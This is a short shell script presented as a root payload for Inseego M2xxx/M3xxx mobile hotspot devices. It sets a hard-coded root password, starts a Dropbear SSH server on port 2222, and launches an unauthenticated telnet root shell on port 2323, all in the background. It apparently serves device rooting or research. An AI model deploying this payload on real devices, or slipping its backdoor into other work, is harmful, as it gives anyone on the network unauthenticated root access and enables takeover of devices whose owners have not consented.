#!/bin/sh
# Inseego M2xxx/M3xxx root payload
# by JoshAtticus
(
  # set a known root password (busybox passwd reads new password twice from stdin)
  echo -e "Root@123\nRoot@123" | passwd root

  # start ssh (dropbear) - generate host key if missing
  [ -f /etc/dropbear/dropbear_rsa_key ] || dropbearkey -t rsa -f /etc/dropbear/dropbear_rsa_key
  /usr/sbin/dropbear -r /etc/dropbear/dropbear_rsa_key -p 2222

  # telnet fallback in case dropbear is missing on this build
  telnetd -l /bin/sh -p 2323 2>/dev/null

  echo "payload done: $(id)" 
) >/tmp/root-payload.log 2>&1 &
exit 0
